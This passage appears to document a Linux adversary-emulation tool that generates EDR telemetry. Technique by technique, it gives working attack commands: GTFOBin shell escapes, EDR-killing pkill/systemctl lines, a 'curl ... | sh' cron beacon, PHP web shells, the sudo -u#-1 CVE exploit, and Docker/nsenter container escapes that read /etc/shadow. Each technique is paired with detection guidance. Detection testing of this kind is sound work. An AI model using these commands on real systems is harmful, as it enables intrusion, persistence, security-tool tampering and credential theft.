1. Iterates through a built-in list of LOLBin patterns (see `LOLBIN_PATTERNS` in `src/techniques/gtfobins.rs`).  Each pattern names the binary that must be present, the full argv to execute, and a brief description of the abuse vector.
2. For each pattern, runs `which <binary>` first and skips cleanly when the binary is missing (no telemetry value in trying to spawn something that does not exist).
3. Spawns the abuse argv with stdout/stderr captured and a 5-second per-pattern timeout.
4. Logs the result with the pattern name, exit code, elapsed milliseconds, and the first line of stdout where present.
5. Sleeps `delay_ms` (default 250ms) between patterns so each parent-process / child-process pair is a discrete event rather than a burst.

Patterns shipped (16 total):
- `awk-system`            -- `awk 'BEGIN{system("id")}'` (awk forking /bin/sh)
- `find-exec`             -- `find /tmp -maxdepth 1 -name . -exec id ;` (find -exec spawn)
- `vim-shell`             -- `vim -E -s -c '!id' -c 'qa!'` (vim Ex-mode shell-out)
- `vi-shell`              -- `vi -e -s -c '!id' -c 'qa!'`
- `ex-shell`              -- `ex -s -c '!id' -c 'qa!'`
- `python-os-system`      -- `python3 -c "import os; os.system('id')"`
- `python-subprocess`     -- `python3 -c "import subprocess; subprocess.run(['id'])"`
- `perl-system`           -- `perl -e "system('id')"`
- `perl-backticks`        -- `perl -e "print \`id\`"`
- `ruby-system`           -- `ruby -e "system('id')"`
- `xxd-passwd`            -- `xxd /etc/passwd` (canonical hex-dump exfil pattern)
- `sed-exec`              -- `sed '1e id' /etc/hostname` (sed e-command shell exec)
- `env-exec`              -- `env id` (env wrapper exec)
- `tar-checkpoint`        -- `tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=id /etc/hostname`
- `gdb-batch-shell`       -- `gdb -q -batch -ex 'shell id'`
- `expect-spawn`          -- `expect -c 'spawn id; expect'`

Parameters:
- `patterns`: Comma-separated list of pattern names to run (default `all`).  Lets operators target a single LOLBin family, e.g. `patterns=vim-shell,ex-shell,vi-shell` to exercise just the editor shell-out vectors.
- `delay_ms`: Milliseconds to sleep between patterns (default 250).  Set to 0 for a burst.

Artefacts: None.  This technique writes nothing to disk; all telemetry is ephemeral parent/child process events.  `cleanup_support` is declared `true` for consistency but `cleanup()` is a no-op.

Detection opportunities:
- Parent-process anomaly: awk / vim / vi / ex / sed / find / perl / python / ruby / tar / gdb / expect / env / xxd forking `/bin/sh`, `/bin/bash`, or a process commonly invoked from shell pipelines
- `awk` with argv containing the literal string `BEGIN{system(`
- `vim` / `vi` / `ex` with `-c '!cmd'` arguments
- `find` invocations with `-exec`
- `perl` / `python` / `python3` / `ruby` with `-e` / `-c` flags carrying `system(`, `exec(`, `os.system(`, `subprocess.`, or backticks
- `tar` with `--checkpoint-action=exec=`
- `gdb -batch -ex 'shell ...'`
- `expect -c 'spawn ...'`
- `xxd` reading `/etc/passwd`, `/etc/shadow`, or any path under `/root/`
- EDR products with parent-process anomaly heuristics (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Elastic Defend) flag these patterns as living-off-the-land binary abuse

### T1562.001 - Disable or Modify Tools

Description:
Attempts the canonical pre-ransomware "kill the EDR" sequence against a curated list of well-known endpoint security agent processes.  CISA 2025 advisories explicitly call out `pkill -f falcon-sensor`, `systemctl stop wazuh-agent`, and the equivalents as the #1 indicator of imminent Linux ransomware deployment, so this technique reproduces that exact behaviour.

How it works:
1. Iterates the built-in target list (11 agents: `falcon-sensor`, `cbagentd`, `wazuh-agent`, `clamav`, `osquery`, `sysdig`, `falco`, `carbonblackd`, `s1agent`, `xagt`, `traps_pmd`) or a comma-separated override from the `process_names` parameter.
2. For each target name, runs three shutdown vectors in sequence:
   - `pkill -f <name>` -- signal-based termination
   - `systemctl stop <name>` -- service-manager shutdown
   - `kill -9 <pid>` -- SIGKILL, but only against PIDs that `pgrep <name>` actually returned (guarded so we never run `kill -9` with no arguments)
3. Every attempt is logged with its exit code to `/tmp/signalbench_t1562_001_<session>.log`.  Failures from non-existent processes or missing units are non-fatal -- the detection signal lives in the process-exec telemetry, not in success.

**Operational caveat:** on a test host that genuinely runs CrowdStrike / Carbon Black / Wazuh / etc., this technique WILL attempt to terminate those agents.  That is the test value.  On a host without those agents the calls fail harmlessly.

Parameters:
- `process_names`: Comma-separated override of the EDR / AV process name list (default: the 11-agent built-in set)

Artefacts:
- `/tmp/signalbench_t1562_001_<session>.log` (removed at cleanup)

Detection opportunities:
- `pkill`, `kill -9`, `systemctl stop` invocations targeting endpoint-security agent process names
- Any of these commands run by a non-root user, or by a parent process that isn't systemd / the package manager, or in rapid sequence against multiple agent names
- CISA 2025 advisory coverage is mature; most EDR products surface this natively without custom rules

### T1620 - Reflective Code Loading (memfd_create)

Description:
Canonical 2025-2026 fileless ELF execution pattern used by BPFDoor variants, Symbiote, and virtually every modern Linux implant.  The technique runs an ELF entirely from anonymous memory, bypassing file-based detection layers (YARA scans, AV signature checks, inotify watches on disk-write paths).

How it works:
1. Writes a short C loader to `/tmp/signalbench_t1620_<session>/loader.c`.
2. Compiles it with `gcc -O2 -Wall -o loader loader.c`.
3. Executes the compiled loader, which:
   - Opens the configured payload (default `/bin/true`)
   - Calls `syscall(SYS_memfd_create, "", MFD_CLOEXEC)` -- the empty name string is the strongest detection fingerprint, because benign uses almost always pass a descriptive name
   - Copies the payload ELF bytes into the memfd
   - Calls `fexecve(fd, argv, envp)` to execute the in-memory ELF
4. The payload (`/bin/true`) exits 0; cleanup removes the entire `/tmp/signalbench_t1620_<session>/` directory.

The detection signal is the `memfd_create("", MFD_CLOEXEC)` + `fexecve` syscall pair from a process whose backing file is not in `/usr/bin` or `/usr/sbin`, not the payload itself.  This makes the technique a faithful telemetry generator while doing nothing more harmful than running `/bin/true` in memory.

Parameters:
- `payload_path`: On-disk ELF whose bytes are loaded into the memfd and `fexecve`'d (default `/bin/true`).  Must be an executable the loader has read access to.

Artefacts:
- `/tmp/signalbench_t1620_<session>/loader.c` (removed at cleanup)
- `/tmp/signalbench_t1620_<session>/loader` (removed at cleanup)
- `/tmp/signalbench_t1620_<session>/` directory (removed at cleanup)

Detection opportunities:
- `memfd_create()` syscalls with an empty name argument
- `fexecve()` from a process whose executable backing is `/memfd:...` rather than an on-disk path
- Process-exec events where `/proc/[pid]/exe` resolves to `/memfd:<anything> (deleted)`
- `gcc` invocations producing binaries under `/tmp` followed immediately by execution of those binaries
- Detection rules from Elastic, Falco and Sysdig all cover the `memfd_create` + `fexecve` pair natively

## EXECUTION Techniques

### T1059 - Advanced Command and Scripting Interpreter

Description:  
Executes malicious commands using various obfuscation techniques and scripting languages to test detection capabilities.

How it works:
1. Supports multiple interpreter types (bash, python, perl)
2. Implements various command obfuscation techniques:
   - Base64 encoding/decoding
   - Hex encoding/decoding
   - Variable concatenation
   - IFS (Internal Field Separator) manipulation
   - Command substitution
3. Creates and executes scripts with suspicious behaviours
4. Logs all command executions and their outputs

Parameters:
- `interpreter`: Type of interpreter to use (bash, python, perl)
- `obfuscation`: Obfuscation technique to apply (base64, hex, variable, none)
- `command`: Command to execute (if not specified, uses reconnaissance commands)
- `output_dir`: Directory to save execution artefacts
- `log_file`: Path to save execution logs

Artefacts:
- Temporary script files (cleaned up automatically after execution)
- Command output logs (cleaned up automatically)
- Execution history logs (cleaned up automatically)

Detection opportunities:
- Execution of encoded/obfuscated commands
- Use of suspicious command patterns
- Commands that access sensitive system information
- Use of eval or other execution functions in scripts
- Multiple command interpreter or encoding techniques in sequence

### T1059 - Possible C2 via dnscat2

Description:  
Downloads and executes a test file named dnscat2 to simulate command and control communications over DNS.

How it works:
1. Uses curl or wget to download a file from the Palo Alto Networks API
2. The downloaded file is a test file designed to look like dnscat2, a known C2 tool
3. The file is executed with basic C2 parameters to simulate a command and control session
4. This test intentionally triggers EDR/AV alerts as it uses a real-world C2 simulation file

Parameters:
- `download_url`: URL to download the file from (default uses a Palo Alto Networks test file)
- `output_file`: Path to save the downloaded file
- `log_file`: Path to save execution logs
- `c2_domain`: Domain to use for simulated C2 communications

Artefacts:
- Downloaded dnscat2 executable (cleaned up automatically after execution)
- C2 execution log file (cleaned up automatically after execution)

Detection opportunities:
- Download of known malicious or suspicious filenames
- Execution of tools known to be used for C2 communications
- DNS traffic patterns consistent with command and control channels
- Creation and execution of files with signatures matching known C2 tools

### T1059.004 - Unix Shell Execution

Description:  
Executes suspicious commands via Unix shell.

How it works:
1. Executes a specified command through a shell
2. Creates a log file documenting the command execution
3. Captures standard output and error from the command

Parameters:
- `shell`: Shell to use for command execution
- `command`: Command to execute
- `log_file`: Path to save execution log

Artefacts:
- Command execution log file (cleaned up automatically after execution)
- Any output file created by the executed command

Detection opportunities:
- Execution of unusual or suspicious shell commands
- Shell commands that create files in temporary directories

### T1059.006 - Python Script Execution

Description:  
Executes a potentially malicious Python script.

How it works:
1. Creates a Python script file with simulated malicious content
2. Script includes various suspicious behaviours like system reconnaissance, file operations
3. Invokes the script via `/bin/sh -c "python3 <script>"` so the process tree is signalbench -> sh -> python3. Real attackers invariably invoke Python through a shell; behavioural rules calibrated on Linux endpoints expect that lineage.

Parameters:
- `script_file`: Path to create and save the Python script
- `log_file`: Path to save execution log

Artefacts:
- Python script file (cleaned up automatically after execution)
- Script execution log file (cleaned up automatically after execution)
- Script output file (cleaned up automatically after execution)

Detection opportunities:
- Creation and execution of Python scripts with suspicious content
- Scripts that collect system information or simulate data exfiltration
- A `/bin/sh -c` parent spawning `python3` running a script from `/tmp`

### T1059.004.001 - Uncommon Remote Shell Commands

Description:  
Generates telemetry for uncommon command execution patterns with randomly generated suspicious command names to trigger baseline anomaly detection systems.

How it works:
1. Randomly generates command names with suspicious suffixes (backdoor, rootkit, keylogger, etc.)
2. Prefixes all commands with 'signalbench_' for safety and identification
3. Creates executable shell scripts with these uncommon command names
4. Executes each command to generate process execution telemetry
5. Logs all execution activities and outputs

Parameters:
- `command_count`: Number of uncommon commands to execute (default: 5)
- `log_file`: Path to save command execution log (default: /tmp/signalbench_uncommon_cmds)

Artefacts:
- Uncommon command scripts (e.g., /tmp/signalbench_backdoor, /tmp/signalbench_rootkit) (cleaned up automatically)
- Command execution log file (cleaned up automatically after execution)

Detection opportunities:
- Monitor for execution of never-before-seen commands (baseline anomaly detection)
- Detection of process names with malicious-sounding keywords
- Execution of binaries from temporary directories with suspicious names
- Process creation patterns matching known attack tool naming conventions
- File creation and immediate execution in /tmp directory
- Commands with prefixes like 'backdoor', 'rootkit', 'keylogger', 'cryptominer', 'ransomware'

## LATERAL_MOVEMENT Techniques

### T1021.004 - SSH Lateral Movement

Description:  
Executes REAL SSH lateral movement attempts using sshpass and ssh commands.

How it works:
1. Attempts SSH connections to specified target hosts
2. Uses key-based authentication to avoid password prompts
3. Creates a log file documenting connection attempts and results

Parameters:
- `targets`: Comma-separated list of IPs or hostnames to target
- `username`: Username to use for SSH connections
- `log_file`: Path to save the log file

Artefacts:
- SSH connection log file (cleaned up automatically after execution)

Detection opportunities:
- Multiple SSH connection attempts in rapid succession
- SSH connections to unusual or varied destinations

## PERSISTENCE Techniques


### T1547.002 - Startup Folder

Description:  
Establishes REAL persistence by creating fully functional .desktop files in the user's XDG autostart directory that will execute commands automatically at user login. This technique creates authentic persistence mechanisms that survive reboots.

How it works:
1. Creates the ~/.config/autostart directory if it doesn't exist
2. Generates a REAL .desktop file with proper XDG Desktop Entry specification format
3. Configures Type=Application with valid Exec, Name, and Comment fields
4. Sets the command to execute automatically when the user logs into their desktop environment
5. Supports both simple commands and complex shell scripts wrapped with /bin/sh -c
6. Creates multiple persistence entries with different application names for comprehensive testing
7. Validates .desktop file syntax to ensure it will be recognised by GNOME, KDE, XFCE environments
8. Tests autostart functionality by verifying file permissions and directory structure

Parameters:
- `app_name`: Name of the desktop application entry (default: SignalBench Persistence)
- `command`: Command to execute at startup (default: echo 'SignalBench startup executed' >> /tmp/signalbench_startup.log)
- `create_multiple`: Whether to create multiple autostart entries with different names (default: false)
- `hidden`: Whether to set Hidden=true to make entry invisible in autostart managers (default: false)

Artefacts:
- .desktop files in ~/.config/autostart directory (cleaned up automatically after execution)
- Autostart directory structure (cleaned up if created by technique)

Detection opportunities:
- Monitor .desktop file creation in ~/.config/autostart directory
- Desktop entry modifications with suspicious Exec commands
- XDG autostart persistence mechanisms in Linux desktop environments
- Hidden desktop entries (Hidden=true flag)
- Unusual application names in autostart directory
- Shell command wrappers in Exec fields (/bin/sh -c patterns)

### T1053.003 - Cron Job

Description:  
Creates REAL scheduled persistence by installing actual cron jobs that execute commands at specified intervals. This technique modifies the user's live crontab to establish authentic time-based persistence mechanisms.

How it works:
1. Backs up the current user's crontab using crontab -l
2. Generates a new cron job entry with realistic scheduling (every 5 minutes, hourly, daily, etc.)
3. INSTALLS the modified crontab using crontab - to make changes live
4. Creates multiple cron job variants:
   - Frequent execution jobs (*/5 * * * * - every 5 minutes)
   - Stealthy daily jobs (0 3 * * * - 3 AM daily)
   - Boot-time jobs (@reboot)
5. Supports both simple commands and complex shell scripts
6. Validates cron syntax before installation
7. Tests job installation by querying crontab -l
8. Creates job output redirection to simulate covert execution (>/dev/null 2>&1)

Parameters:
- `cron_expression`: Cron expression for scheduling (default: */5 * * * *)
- `command`: Command to execute in cron job (default: /tmp/signalbench_persistence.sh)
- `create_multiple`: Whether to create multiple jobs with different schedules (default: false)
- `stealth_mode`: Whether to redirect output to /dev/null (default: true)

Artefacts:
- Modified user crontab (restored automatically during cleanup)
- Crontab backup file (cleaned up automatically after execution)
- Cron job entries (removed during cleanup via crontab restoration)

Detection opportunities:
- Monitor crontab command execution (crontab -, crontab -e)
- Modifications to user crontab files (/var/spool/cron/crontabs/*)
- Unusual or suspicious cron job entries with frequent execution intervals
- Commands redirecting output to /dev/null (stealth indicator)
- Cron jobs executing scripts from /tmp or other writable directories
- @reboot cron jobs for boot persistence

### T1543 - Create or Modify System Process

Description:  
Creates or modifies system services and processes to establish persistence on the system.

How it works:
1. Supports multiple service types:
   - systemd service units
   - init.d scripts
   - rc.local entries
2. Creates actual service definition files
3. Installs services (if permissions allow) or simulates installation
4. Attempts to start the service (controlled environment)
5. Logs all service creation operations

Parameters:
- `service_type`: Type of service to create (systemd, init.d, rc_local)
- `service_name`: Name for the service
- `command`: Command to execute when service runs
- `output_dir`: Directory to save service files
- `install`: Whether to attempt installation (requires privileges)

Artefacts:
- Service definition files (cleaned up automatically)
- Service installation logs (cleaned up automatically)
- Installed services (removed during cleanup if installed)

Detection opportunities:
- Creation of new service files
- Modifications to startup processes
- Services executing suspicious commands
- Services with unusual configurations or permissions

### T1505.003 - Web Shell Deployment

Description:  
Deploys REAL, functional web shells that can handle HTTP requests and execute commands on Linux-based web servers. This technique creates authentic PHP, JSP, and Python backdoors with actual remote command execution capabilities for comprehensive testing.

How it works:
1. Creates web root directory structure (/tmp/www for safe testing)
2. Deploys REAL PHP web shells with $_GET, $_POST, and $_REQUEST handlers
3. Implements functional command execution using shell_exec(), system(), and passthru()
4. Creates JSP web shells with Runtime.getRuntime().exec() for Java environments
5. Builds Python Flask-based web shells for WSGI applications
6. Implements multiple web shell variants:
   - Simple one-liner shells (<?php system($_GET['cmd']); ?>)
   - Obfuscated shells with base64 encoding
   - Feature-rich shells with file upload, download, and directory browsing
7. Sets proper file permissions (644 or 755) to make shells executable by web server
8. Tests web shell functionality by invoking commands
9. Creates realistic file names (config.php, admin.php, upload.jsp) to evade detection

Parameters:
- `web_root`: Web server document root directory (default: /tmp/www)
- `shell_type`: Type of web shell to deploy - php, jsp, python (default: php)
- `shell_name`: Filename for the web shell (default: config.php)
- `create_multiple`: Whether to deploy multiple shell variants (default: true)
- `obfuscate`: Whether to use obfuscation techniques (default: false)

Artefacts:
- Web shell files (PHP, JSP, Python) (cleaned up automatically after execution)
- Web root directory structure (cleaned up automatically)
- Test command output files (cleaned up automatically)

Detection opportunities:
- Monitor web directories (/var/www, /usr/share/nginx, /tmp/www) for suspicious script files
- File creation in web document roots with common web shell names (shell.php, cmd.php, admin.jsp)
- PHP files containing dangerous functions (shell_exec, system, passthru, eval)
- JSP files with Runtime.getRuntime().exec() patterns
- Unusual web server child processes executing system commands
- Web application firewall (WAF) detection of command execution patterns
- File permission changes in web directories

### T1098 - Account Manipulation

Description:  
Performs REAL account manipulation by modifying user account properties, adding SSH keys, and changing group memberships to establish persistent access. This technique makes actual changes to user accounts whilst maintaining 100% safety and reversibility.

How it works:
1. Creates test user accounts using useradd for manipulation testing
2. MODIFIES /etc/passwd entries to change user shells and home directories
3. Injects SSH public keys into authorized_keys files for key-based authentication
4. Adds users to privileged groups (sudo, wheel, adm) using usermod -aG
5. Modifies /etc/group directly to add users to multiple groups simultaneously
6. Changes user account attributes (comment field, UID, GID) for stealth
7. Creates .ssh directories with proper permissions (700 for directory, 600 for authorized_keys)
8. Tests SSH key injection by verifying authorized_keys file content
9. Backs up all modified files before changes for complete restoration
10. Implements multiple manipulation techniques:
    - Direct file editing (/etc/passwd, /etc/group, /etc/shadow)
    - System commands (usermod, gpasswd, chsh)
    - SSH configuration changes

Parameters:
- `target_user`: Username to manipulate (default: creates test user signalbench_test)
- `ssh_key_inject`: Whether to inject SSH public key (default: true)
- `add_to_groups`: Comma-separated list of groups to add user to (default: sudo,adm)
- `modify_shell`: New shell to set for user (default: /bin/bash)
- `backup_files`: Whether to backup files before modification (default: true)

Artefacts:
- Modified /etc/passwd entries (restored automatically during cleanup)
- Modified /etc/group entries (restored automatically)
- Injected SSH keys in ~/.ssh/authorized_keys (cleaned up automatically)
- Test user accounts created (removed automatically during cleanup)
- Backup files of modified system files (cleaned up automatically)

Detection opportunities:
- Monitor usermod, gpasswd, chsh command execution
- Watch for modifications to /etc/passwd, /etc/group, /etc/shadow files
- Detect SSH authorized_keys file modifications
- Monitor user additions to privileged groups (sudo, wheel, root)
- Track changes to user account attributes (UID, GID, shell, home directory)
- File integrity monitoring (FIM) alerts on critical system files
- Unusual .ssh directory creation in user home directories

## PRIVILEGE_ESCALATION Techniques

### T1548.003 - Sudoers Modification

Description:  
Executes REAL sudoers file modification attempts to grant elevated privileges.

How it works:
1. Creates a temporary sudoers file in the /etc/sudoers.d/ directory
2. Grants specified privileges to a user
3. Validates syntax of the sudoers file before installation
4. Post-escalation verification: runs `sudo -n id -u` as a child process and logs the observed EUID

Verification phase:
- Uses shared `verify_command` helper to run `sudo -n id -u` after the sudoers entry is active
- Logs `[T1548.003] [VERIFIED] sudo ok: 0` when the escalation path is confirmed
- On success, additionally logs `[T1548.003] [CRITICAL] Privilege escalation VERIFIED: sudo ok: 0`
- Logs `[T1548.003] [UNVERIFIED] <reason>` when the escalation is not achieved
- Verification failure does not prevent cleanup

Parameters:
- `username`: User to grant elevated privileges
- `privileges`: Privileges to grant (e.g., "ALL=(ALL:ALL) NOPASSWD: ALL")

Artefacts:
- Sudoers file in /etc/sudoers.d/ (cleaned up automatically after execution)

Detection opportunities:
- Creation or modification of files in /etc/sudoers.d/
- Changes to sudo privileges
- `sudo -n id -u` execution immediately after sudoers modification (post-escalation EUID check)

### T1548.003.001 - Sudo Unsigned Integer Privilege Escalation

Description:  
Exploits CVE-2019-14287 sudo vulnerability using negative or large unsigned integer user IDs to bypass sudo restrictions and execute commands as root.

How it works:
1. Exploits a vulnerability in sudo versions < 1.8.28 where negative user IDs (-u#-1) or large unsigned integers (-u#4294967295) are interpreted as UID 0 (root)
2. Attempts to execute a specified command using both exploitation variants
3. Tests the vulnerability by running commands that would normally be restricted
4. Logs all exploitation attempts and results for analysis

Parameters:
- `command`: Command to execute via sudo exploitation (default: "id")
- `test_both_variants`: Whether to test both -u#-1 and -u#4294967295 methods (default: "true")
- `log_file`: Path to save exploitation log (default: "/tmp/signalbench_sudo_exploit.log")

Artefacts:
- Sudo exploitation log file (cleaned up automatically after execution)

Detection opportunities:
- Monitor for sudo commands with negative user IDs (-u#-1)
- Watch for sudo commands with large unsigned integers (-u#4294967295)
- Unusual sudo activity from non-privileged users attempting root access
- CVE-2019-14287 exploitation patterns in authentication logs

### T1548.001 - SUID Binary

Description:  
Executes REAL SUID bit setting attempts on binaries for privilege escalation.

How it works:
1. Creates a small executable file
2. Sets the SUID bit on the file
3. Simulates how this could be used for privilege escalation
4. Post-escalation verification: invokes the SUID binary, parses `Effective UID:` from its output, and logs the observed EUID

Verification phase:
- Uses shared `verify_command` helper to invoke the SUID binary and check for `Effective UID: 0` in its stdout
- Logs `[T1548.001] [VERIFIED] SUID binary ran with Effective UID: 0` when escalation is confirmed
- On success, additionally logs `[T1548.001] [CRITICAL] Privilege escalation VERIFIED: SUID binary ran with Effective UID: 0`
- Logs `[T1548.001] [UNVERIFIED] <reason>` when escalation is not achieved
- Verification failure does not prevent cleanup

Parameters:
- `target_binary`: Path to create the SUID binary

Artefacts:
- SUID binary file (cleaned up automatically after execution)

Detection opportunities:
- Creation of new SUID binaries
- Modification of file permissions to add SUID bit
- Execution of SUID binary immediately after chmod u+s (post-escalation EUID check)

### T1136.001 - Local Account Creation

Description:  
Adding new privileged users (e.g., via useradd, passwd, or direct /etc/passwd modification).

How it works:
1. Simulates creating new user accounts with elevated privileges
2. Creates harmless test files that represent user account entries
3. Does not modify actual system files for safety
4. Simulates /etc/passwd and /etc/shadow modifications

Parameters:
- `username`: Username for the new account
- `groups`: Groups to add the user to  
- `shell`: Default shell for the user

Artefacts:
- Test user account files (cleaned up automatically after execution)

Detection opportunities:
- Monitor for new user account creation
- Changes to /etc/passwd, /etc/shadow
- Unusual useradd/usermod commands

### T1068 - Exploitation for Privilege Escalation

Description:  
Performs both enumeration of local privilege-escalation vectors and active exploitation attempts against them. Covers the canonical CVE-2019-14287 sudo PoC, GTFOBin shell-escape patterns against discovered SUID binaries, writable systemd unit exploitation, NOPASSWD sudo command execution, Docker socket abuse, and writable cron file modification. All exploit attempts are reversible.

How it works:
1. Section 0 - CVE-2019-14287 PoC: runs `sudo -n -u#-1 id` (the canonical published PoC). On patched sudo it fails with an authentication error but still produces an auth-log entry showing the unusual `-u#-1` argument; on an unpatched system the EUID returns 0.
2. Section 1 - SUID enumeration + GTFOBin invocation: enumerates SUID binaries under `/usr/bin`, `/usr/sbin`, `/usr/local/bin`, `/usr/local/sbin`, `/bin`, `/sbin`, then for any binary whose basename matches a known GTFOBin pattern (find, awk, python, python3, perl, env, vim, less) fires the canonical shell-escape invocation through `/bin/sh -c` with `timeout 1` so the spawned shell exits immediately. The exec attempt itself is the telemetry signal.
3. Section 2 - Systemd unit exploitation: when `/etc/systemd/system` is writable, creates a test service, runs `systemctl daemon-reload`, then attempts `systemctl start`. The created service file is tracked for cleanup.
4. Section 3 - Writable cron files: enumerates writable cron files under `/etc/crontab`, `/etc/cron.d`, and `/var/spool/cron`, then appends a recognisable beacon line of the form `* * * * * root /bin/sh -c 'curl -s http://<sinkhole>/sb-<session> | sh'` to each one. The original file is backed up first and restored on cleanup.
5. Section 4 - Sudo NOPASSWD exploitation: runs `sudo -n -l` to enumerate permissions, parses NOPASSWD entries, then attempts to execute the safe ones (whoami, id, ls, cat, echo, true, false, pwd) to confirm exploitability.
6. Section 5 - Docker socket exploitation: when `/var/run/docker.sock` is accessible, runs `docker ps` then `docker run --rm alpine echo` to confirm escape capability.
7. Section 6 - Kernel version enumeration: reads `/proc/version` and `uname -r` for vulnerable-kernel matching.

Parameters:
- `suid_scan`: Enable SUID enumeration and GTFOBin invocation (default: true)
- `systemd_exploit`: Attempt writable systemd unit exploitation (default: true)
- `cron_scan`: Enable writable cron enumeration and beacon append (default: true)
- `sudo_exploit`: Attempt NOPASSWD sudo command execution (default: true)
- `docker_exploit`: Attempt Docker socket exploitation (default: true)
- `kernel_check`: Enable kernel version enumeration (default: true)
- `log_file`: Path to save the detailed exploitation log

Artefacts:
- Detailed exploitation log (cleaned up automatically after execution)
- Created systemd service file at `/etc/systemd/system/signalbench-test.service` (removed on cleanup with daemon-reload)
- Cron file backups under `/tmp/signalbench_cron_backup_*` (restored to original location on cleanup, then removed)
- The appended cron beacon line in each writable cron file (removed on cleanup by restoring the backup)

Detection opportunities:
- `sudo` invoked with `-u#-1` or similar negative UID syntax (CVE-2019-14287 PoC fingerprint)
- Suspicious GTFOBin invocations: `find ... -exec /bin/sh -p \;`, `awk 'BEGIN {system(...)}'`, `python -c 'os.execl("/bin/sh", "sh", "-p"...)'`, `perl -e 'exec "/bin/sh", "-p"...'`
- Service file creation under `/etc/systemd/system/` followed by `systemctl daemon-reload` and `systemctl start`
- Append of a cron line containing `curl ... | sh` to `/etc/crontab` or `/etc/cron.d`
- `sudo -n -l` enumeration followed by NOPASSWD command execution
- Direct interaction with `/var/run/docker.sock` via the docker CLI or curl

## CONTAINER_ESCAPE Techniques (T1611)

Container escape techniques detect and simulate methods for breaking out of containerised environments to access the underlying host system. Based on Unit42 research, deepce enumeration capabilities, and MITRE ATT&CK T1611 specifications. These techniques execute real commands to generate EDR/XDR telemetry whilst remaining safe and non-destructive.

### T1611-SOCK - Docker Socket Escape

Description:  
Detects and attempts container escape via exposed Docker socket. When /var/run/docker.sock is mounted inside a container, an attacker can communicate with the Docker daemon to create privileged containers, mount the host filesystem, and execute commands on the host. This technique performs ACTUAL escape exploitation by spawning a privileged container that creates a marker file on the host filesystem.

How it works:
1. Checks for Docker socket at /var/run/docker.sock and alternative locations
2. Executes REAL Docker CLI commands and Docker API calls
3. Enumerates Docker version and configuration
4. Lists running containers, images, and networks on the host
5. Attempts to pull alpine image for escape demonstration
6. SPAWNS A PRIVILEGED CONTAINER that mounts host root and creates a marker file
7. Verifies escape success by checking for marker file creation on host
8. Cleans up spawned container and marker file automatically

Commands Executed:
```bash
docker version                              # Docker version info
docker info                                 # Docker daemon configuration
docker ps -a                                # All containers (running/stopped)
docker images                               # Available images
docker network ls                           # Docker networks
curl --unix-socket /var/run/docker.sock http://localhost/version    # Docker API version
curl --unix-socket /var/run/docker.sock http://localhost/info       # Docker API info
curl --unix-socket /var/run/docker.sock http://localhost/containers/json  # Container list
socat - UNIX-CONNECT:/var/run/docker.sock   # Socket connectivity test
docker pull alpine                          # Pull escape base image
docker run --rm --privileged -v /:/host alpine /bin/sh -c "echo 'SignalBench...' > /host/tmp/signalbench_socket_escape_marker"  # ACTUAL ESCAPE
```

Parameters:
- `socket_path`: Path to Docker socket (default: /var/run/docker.sock)
- `output_dir`: Directory for enumeration output files
- `test_api`: Attempt Docker API calls via curl/socat

Artefacts:
- Docker version JSON file (cleaned up automatically after execution)
- Container list JSON file (cleaned up automatically after execution)
- Escape simulation script (cleaned up automatically after execution)
- Socket escape report (cleaned up automatically after execution)
- Host marker file: /tmp/signalbench_socket_escape_marker (cleaned up automatically)

XDR Detection Signatures:
- docker run --privileged with -v /:/host mount pattern
- Container spawned from within container (nested container creation)
- File creation on host /tmp from container process
- Docker socket API calls from non-daemon processes
- Alpine image pull followed by privileged container execution
- curl/socat connections to Docker socket
- Container creation with full host filesystem mount
- POST /containers/create API calls with privileged config (Unit42)
- POST /containers/{id}/start API calls from container (Unit42)
- DELETE /containers/{id} API calls (container removal)
- Docker API responses containing container IDs
- JSON body with "Privileged":true, "Binds":["/:/host"] patterns

Host Access Verification:
After spawning the privileged container, this technique runs
`docker run --rm -v /:/host:ro alpine cat /host/etc/shadow` (15 s
timeout) and inspects the output for a line starting with `root:`. On
success it logs `[T1611-SOCK] [VERIFIED] ...` followed by
`[T1611-SOCK] [CRITICAL] Host filesystem access VERIFIED: ...`. If the
sibling-container marker was never created or `attempt_run=false`, an
explicit `[T1611-SOCK] [UNVERIFIED] ...` line is emitted instead so
every run carries a marker. Detection engineers should grep for
`[CRITICAL] Host filesystem access VERIFIED` as the highest-confidence
post-escape signal.

### T1611-PRIV - Privileged Container Escape

Description:  
Detects privileged container configurations that enable host escape. Executes capability enumeration, device discovery, and mount operations to generate telemetry. When namespace escape succeeds, CREATES A MARKER FILE ON THE HOST FILESYSTEM to prove host access.

How it works:
1. Parses capabilities from /proc/self/status
2. Executes commands for capability and device enumeration
3. Attempts mount operations requiring elevated privileges
4. Enumerates block devices and namespace information
5. Tests namespace escape via nsenter --target 1 --all
6. ON SUCCESS: Creates marker file /tmp/signalbench_priv_escape_marker on host via nsenter
7. Cleans up marker file automatically via nsenter during cleanup

Commands Executed:
```bash
capsh --print                               # Capability enumeration
lsblk                                       # Block device listing
fdisk -l                                    # Disk partition information
blkid                                       # Block device attributes
mount --bind / /tmp/signalbench_bind_test   # Bind mount attempt
mount -t tmpfs tmpfs /tmp/signalbench_tmpfs_test  # tmpfs mount attempt
nsenter --target 1 --mount -- ls /          # Namespace escape attempt
nsenter --target 1 --uts -- hostname        # UTS namespace probe
nsenter --target 1 --pid -- ps              # PID namespace probe
nsenter --target 1 --all -- /bin/sh -c "echo 'SignalBench...' > /tmp/signalbench_priv_escape_marker"  # ACTUAL HOST ACCESS
```

Parameters:
- `output_dir`: Directory for capability enumeration output
- `test_mount`: Attempt test mount operations (requires CAP_SYS_ADMIN)

Artefacts:
- Capabilities dump file (cleaned up automatically after execution)
- Block devices enumeration (cleaned up automatically after execution)
- Mount test results (cleaned up automatically after execution)
- Privileged escape report (cleaned up automatically after execution)
- Host marker file: /tmp/signalbench_priv_escape_marker (cleaned up automatically via nsenter)

XDR Detection Signatures:
- nsenter --target 1 --all with command execution
- File creation on host filesystem via namespace escape
- capsh --print capability enumeration from containers
- lsblk/fdisk/blkid device discovery commands
- mount --bind and mount -t tmpfs attempts
- Process targeting PID 1 from container
- CAP_SYS_ADMIN + CAP_SYS_PTRACE usage patterns

Host Access Verification:
After the nsenter marker write, this technique runs
`nsenter --target 1 --mount --pid -- cat /proc/1/comm` (10 s timeout) and
requires the trimmed value to match a known host init binary
(`systemd`, `init`, `upstart`, `openrc`, `sysvinit`, `launchd`). A
non-empty cmdline alone is not enough — the container's own PID 1
cmdline is also non-empty, so the check would otherwise false-positive.
